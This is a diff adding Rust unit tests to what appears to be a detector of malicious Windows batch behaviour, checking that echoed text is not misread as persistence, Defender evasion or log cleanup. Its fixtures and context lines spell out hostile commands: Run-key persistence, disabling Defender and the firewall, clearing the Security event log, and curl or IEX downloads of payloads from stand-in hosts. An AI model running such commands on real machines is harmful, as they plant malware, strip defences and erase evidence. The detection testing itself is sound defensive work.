@@ -2548,6 +2548,25 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn escaped_ampersand_powershell_run_key_text_does_not_emit_persistence() {
+        let script = br#"echo keep ^& powershell Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Updater C:\Users\Public\updater.exe"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "HKCU"
+                        && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                        && value_name == "Updater"
+                        && command == r"C:\Users\Public\updater.exe"
+            )),
+            "escaped echo PowerShell Run-key text emitted Persistence: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_reg_alias_replays_run_key_persisted_command() {
         let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
 C:\Users\Public\rg.tmp add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "cmd.exe /V:ON /c set U=https://copied-reg.example/payload.exe&&curl -o payload.exe !U!" /f
@@ -3543,6 +3562,39 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
             "escaped ampersand echo text was misread as sc Defender evasion: {:?}",
             report.traits
         );
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_defender_text_does_not_emit_evasion() {
+        for (script, unexpected_action) in [
+            (
+                br#"echo keep ^& powershell Add-MpPreference -ExclusionPath C:\Users\Public"#.as_slice(),
+                "exclusion-path",
+            ),
+            (
+                br#"echo keep ^& powershell Set-MpPreference -DisableRealtimeMonitoring $true"#.as_slice(),
+                "setmp-disablerealtimemonitoring",
+            ),
+            (
+                br#"echo keep ^& netsh advfirewall set allprofiles state off"#.as_slice(),
+                "netsh-fw-off",
+            ),
+            (
+                br#"echo keep ^& powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"#.as_slice(),
+                "firewall-profile-disabled",
+            ),
+        ] {
+            let report = analyze(script, &AnalyzeConfig::default());
+
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, .. } if action == unexpected_action
+                )),
+                "escaped echo Defender text emitted {unexpected_action}: {:?}",
+                report.traits
+            );
+        }
     }
 
     #[test]
@@ -8697,6 +8749,31 @@ powershell -Command "Clear-RecycleBin -Force"
                         if action == "event-log-clear" && target == log_name
                 )),
                 "PowerShell short Clear-EventLog LogName target missing {log_name}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_cleanup_text_does_not_emit_evidence_cleanup() {
+        for (script, unexpected_action) in [
+            (
+                br#"echo keep ^& powershell Clear-EventLog -LogName Security"#.as_slice(),
+                "event-log-clear",
+            ),
+            (
+                br#"echo keep ^& powershell Clear-RecycleBin -Force"#.as_slice(),
+                "recycle-bin-clear",
+            ),
+        ] {
+            let report = analyze(script, &AnalyzeConfig::default());
+
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::EvidenceCleanup { action, .. } if action == unexpected_action
+                )),
+                "escaped echo cleanup text emitted {unexpected_action}: {:?}",
                 report.traits
             );
         }
